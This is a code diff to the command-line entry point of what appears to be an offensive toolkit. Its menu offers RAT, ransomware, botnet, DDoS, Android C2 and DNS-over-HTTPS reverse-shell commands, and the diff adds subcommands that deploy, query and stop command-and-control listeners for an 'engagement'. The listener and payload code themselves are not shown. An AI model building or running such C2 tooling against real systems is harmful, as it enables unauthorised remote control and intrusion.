@@ -239,7 +239,7 @@ def main(argv=None):
                             "rat", "ransomware", "botnet", "ddos",
                             "messaging", "stego", "apn", "exif",
                             "darkweb", "dorks", "shodan", "map2d", "phantomdroid",
-                            "dohshell"],
+                            "dohshell", "listener"],
                    help="direct command (optional)")
     p.add_argument("--menu", action="store_true", help="manual console")
     p.add_argument("--scope", "-c", dest="cidr", help="autonomous/scan scope CIDR")
@@ -609,6 +609,32 @@ def main(argv=None):
             print(json.dumps(generate_android_c2_config(a.domain or "c2.example.com"), indent=2)); return
         fn = generate_doh_reverse_shell_agent(a.domain or "c2.example.com", a.target or "192.168.1.1:8443")
         print(json.dumps({"agent": fn, "platform": "posix"}, indent=2)); return
+    elif a.cmd == "listener":
+        from quantum.c2.listener import ListenerManager
+        mgr = ListenerManager()
+        if a.query == "stop":
+            ok = mgr.stop(a.target)
+            print(json.dumps({"stopped": ok, "port": a.target}, indent=2)); return
+        if a.query == "stopall":
+            mgr.stop_all()
+            print(json.dumps({"stopped": "all"}, indent=2)); return
+        if a.query == "hits":
+            print(json.dumps(mgr.get_hits(a.target), indent=2, default=str)); return
+        if a.query == "active":
+            print(json.dumps(mgr.get_active(), indent=2, default=str)); return
+        # deploy: --target <ip> --query deploy
+        listener = mgr.deploy(
+            name=a.query or f"engagement-{int(time.time())}",
+            target=a.target or "unknown",
+            exploit_type=a.query or "unknown",
+        )
+        if listener:
+            print(json.dumps(listener.status(), indent=2, default=str)); return
+        print(json.dumps({"error": "deploy failed"}, indent=2)); return
+    elif a.cmd == "listeners":
+        from quantum.c2.listener import ListenerManager
+        mgr = ListenerManager()
+        print(json.dumps(mgr.list_all(), indent=2, default=str)); return
 
 
 if __name__ == "__main__":
